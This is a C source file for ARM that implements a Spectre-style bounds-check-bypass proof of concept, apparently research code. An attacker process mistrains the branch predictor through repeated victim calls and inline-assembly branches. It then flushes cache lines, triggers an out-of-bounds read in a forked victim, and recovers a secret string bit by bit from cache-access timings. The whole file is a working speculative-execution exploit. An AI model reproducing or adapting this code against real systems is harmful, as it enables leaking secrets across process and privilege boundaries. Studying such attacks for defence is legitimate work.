#pragma GCC push_options
#pragma GCC optimize ("O0")
#define _GNU_SOURCE
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include "armpmu_lib.h"
#include <semaphore.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <string.h>

#define OOB_READ 16			// Number of byte read
#define ARRAY_SIZE 46		// Array1 size
#define FAKE_SIZE 13
#define MISTRAIN 10			// Parameter for mistraining
#define SAME_BIT_CYCLES 10	// Number of reading tries on the same byte
#define CACHE_LINES 128
#define N_OF_BITS 8 //number of bits in a byte
#define LATENCY_THRESHOLD	100
#define ARRAY2_SIZE 256*64
#define SPACE_FOR_PARAMS 50
#define SB 0
#define LINE_DISTANCE 64*64
extern void victimCode(int* array1_size,char* array1,char* array2,long int junk,int x);
extern long int Flush(long int line);
void callFakeBranches();

// pointer used to keep the starting address of the memory mapped region 
char *ptr;

//pipes pointers
int A2Vpipe_ptr[2];
int V2Apipe_ptr[2];

// Victim variables
char array1[ARRAY_SIZE];
char s[]="SecretStringOutside";
int array1_size = FAKE_SIZE;

// Attacker variables
int x;

char junk; // Used when reading cache latency, and also when passing the bit number to the victim

uint32_t start,end;
uint32_t timings[OOB_READ][N_OF_BITS][2]; // first index to scan reads of different bytes, second one to scan the single byte and find a bit, the third one for the value of the timing for the single bit
char byte_read,bit_read;
// Just indexes
int i,j,k,h,l,m;

// Cache timings file
FILE* fout;

int main(void){
	cpu_set_t  mask;
	CPU_ZERO(&mask);
	CPU_SET(0, &mask); // father and child will run in the same cpu, we chose CPU0

	if(sched_setaffinity(0, sizeof(mask), &mask)==-1) //0 as the first parameter works as getpid
		exit(1);
	// Timing File
	if((fout=fopen("cacheTimingsNewFormat.txt","w"))==NULL){
		printf("File open error\n");
		exit(1);
	}

	// Timing matrix initialization
	for(i=0;i<OOB_READ;i++){
		for(j=0;j<N_OF_BITS;j++){
			timings[i][j][0]=0;
            timings[i][j][1]=0;
        }
    }
	//mmap and pipes setup
	ptr = mmap(NULL, (ARRAY2_SIZE+SPACE_FOR_PARAMS), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);
	if(ptr==MAP_FAILED){
		printf("mmap failed\n");
		return 1;
	}
 
	/* MAPPED MEMORY LAYOUT (scanned by a char pointer):
			ADDRESSES FROM 0 TO ARRAY2_SIZE-1: array2
			ADDRESSES FROM ARRAY2_SIZE TO ARRAY2_SIZE+3: int x
			ADDRESSES FROM ARRAY2_SIZE+4 TO ARRAY2_SIZE+11: long int junk
	*/
	if(pipe(A2Vpipe_ptr)==-1){
		printf("pipe allocation A2V failed\n");
		return 1;
	}
	if(pipe(V2Apipe_ptr)==-1){
		printf("pipe allocation V2A failed\n");
		return 1;
	}

	int pid=fork();
	if(pid==0){
    //victim
		char placeholder='A';
		char buf;
		// set up array1 with the public and secret contents (not visible to the father thanks to the copy on write policy)
		for(i=0;i<ARRAY_SIZE;i++)
			array1[i]=i+48;
		// wait for father request
		while(read(A2Vpipe_ptr[0],&buf,1)>0){ //NULL or a char variable?
			//not necessary to flash shared mem, already done in the attacker
			victimCode(&array1_size,array1,ptr,ptr[ARRAY2_SIZE+4],ptr[ARRAY2_SIZE]); //array1_size by reference (to avoid caching it before time), ptr (array2), ptr[ARRAY2_SIZE+4] (k), ptr[ARRAY2_SIZE] (x)
			// probably we are passing as part of x also the lsbs of junk, but in the victim code we filter them out (check the objdump)
			write(V2Apipe_ptr[1],&placeholder,1);
		}
		return 0;
	}else{
		//attacker
		char placeholder='A';
		char buf;
		char *addr;
		for(i=0,x=SB;i<OOB_READ;i++,x++){ //to scan over different reads
			byte_read=0;
			//printf("\n----------------- #%d --------------\n",i);
			for(m=0;m<N_OF_BITS;m++){ // to read a single byte one bit at a time
			// SAME_BYTE_CYCLES tries for each byte

				//srand(time(NULL));

				for(j=0;j<SAME_BIT_CYCLES;j++){ // to reread the bit multiple times, just to be safe

            k=0;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1);
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1);
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1);
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?
            k++;
            memcpy(&ptr[ARRAY2_SIZE],&k,sizeof(int)); // to copy the value of k in the shared memory
            memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory
            write(A2Vpipe_ptr[1],&placeholder,1);
            read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?


					memcpy(&ptr[ARRAY2_SIZE],&x,sizeof(int)); // to copy the value of k in the shared memory
					memcpy(&ptr[ARRAY2_SIZE+4],&m,sizeof(long int)); //to copy the value of m in the shared memory

					// Flush the shared memory
					for(k=0;k<ARRAY2_SIZE+SPACE_FOR_PARAMS;k++) // Flushing array2
						Flush(&ptr[k]);

					//Flush everything else
					for(k=0;k<ARRAY_SIZE;k++)
						Flush(&array1[k]); // we still flush it for safety, probably there is no need because it contains dummy data for the father that are never accessed

					for(k=0;k<OOB_READ;k++)
						for(l=0;l<N_OF_BITS;l++){
							Flush(&timings[k][l][0]);
							Flush(&timings[k][l][1]);
						}

					// array1_size must be known by the father because it needs to issue requests for the mistraining
					Flush(&array1_size);
					//callFakeBranches();  // Mistraining branch predictor (setting BHR to 0000000000)
					
//					asm volatile(	"nop				\t\n");
					asm volatile(	"nop				\t\n");
					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8			 	\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );

					asm volatile(	"cmn sp,#0			\t\n"
									"beq 8		 		\t\n"
									"nop				\t\n"
															 );


					
					
				// Call using malicious x
					write(A2Vpipe_ptr[1],&placeholder,1);
					read(V2Apipe_ptr[0],&buf,1); //NULL or character placeholder?

				// Side channel exploitation
					for(k=0;k<2;k++){
						// Non-cached read
						addr = &ptr[k*LINE_DISTANCE];
						start=rdtsc32();
						junk &= *addr;
						end=rdtsc32();
						timings[i][m][k]+=end-start;
					}
				}
			// Avg timing for each cache line read (trying to detect a threshold between cached and not cached)
				fprintf(fout,"BIT %d: ",m);
				for(k=0;k<2;k++){
					timings[i][m][k]/=SAME_BIT_CYCLES;
					if(timings[i][m][0]>LATENCY_THRESHOLD){		// If bit=0 the value is already set since byte_read is initialized to 0
						bit_read = 0x1 << m;
						byte_read |= bit_read;
					}
					fprintf(fout,"%u ",timings[i][m][k]);
				}
				fprintf(fout,"\n");
			}
			printf("%c",byte_read);
		}
	}
	printf("\n");
	fclose(fout);
	close(A2Vpipe_ptr[1]);
	munmap(ptr,ARRAY2_SIZE+SPACE_FOR_PARAMS);
	return 0;
}

#pragma GCC pop_options
